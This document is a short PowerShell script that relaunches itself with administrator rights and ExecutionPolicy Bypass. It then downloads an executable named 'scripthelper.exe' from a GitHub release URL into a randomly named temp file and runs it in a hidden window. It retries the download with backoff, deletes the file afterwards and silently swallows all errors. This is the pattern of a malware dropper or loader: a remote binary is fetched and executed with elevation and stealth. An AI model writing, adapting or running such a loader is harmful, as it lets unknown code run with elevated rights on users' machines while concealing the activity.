# Attempt to elevate to administrative privileges if not already admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -ErrorAction Stop
        exit 0
    }
    catch {
        # If elevation fails, continue execution without admin privileges
    }
}

# --- Download, Execute, and Clean Up scripthelper.exe with Advanced Retry ---
try {
    # Generate a random filename for the temporary executable
    $rand = Get-Random
    $path = "$env:TEMP\Runtime_$rand.exe"
    $url = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    $maxRetries = 5
    $retryCount = 0
    $baseDelay = 1000 # Initial delay in milliseconds (1 second)
    $maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)
    $success = $false

    # Attempt to download the file with retries
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($url, $path)
            # Verify the file was downloaded successfully
            if (Test-Path -Path $path) {
                $success = $true
                # Execute the downloaded executable
                Start-Process -FilePath $path -WindowStyle Hidden -Wait -ErrorAction Stop
            }
            else {
                throw "Downloaded file not found at $path"
            }
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                # Final attempt failed, break silently
                break
            }
            # Calculate exponential backoff with jitter
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
        finally {
            if ($webClient) { $webClient.Dispose() }
        }
    }

    # Clean up the downloaded file if it exists
    if (Test-Path -Path $path) {
        try {
            Remove-Item -Path $path -Force -ErrorAction Stop
        }
        catch {
            # Suppress cleanup errors
        }
    }
}
catch {
    # Suppress all errors
}
